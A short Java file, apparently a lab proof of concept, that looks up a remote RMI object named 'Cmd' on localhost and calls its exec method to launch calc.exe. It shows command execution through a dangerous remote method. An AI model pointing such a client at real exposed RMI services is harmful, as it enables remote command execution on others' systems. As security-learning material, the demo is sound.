package org.example.client;

import org.example.remoteInterface.DangeriousFunc1;
import java.lang.reflect.InvocationTargetException;
import java.net.MalformedURLException;
import java.rmi.Naming;
import java.rmi.NotBoundException;
import java.rmi.RemoteException;

public class AttackDangerServer {
    public static void main(String[] args) throws MalformedURLException, NotBoundException, RemoteException, ClassNotFoundException, InvocationTargetException, NoSuchMethodException, IllegalAccessException {
        DangeriousFunc1 dangeriousFunc1 = (DangeriousFunc1) Naming.lookup("rmi://127.0.0.1:1099/Cmd");
        dangeriousFunc1.exec("calc.exe");
    }
}
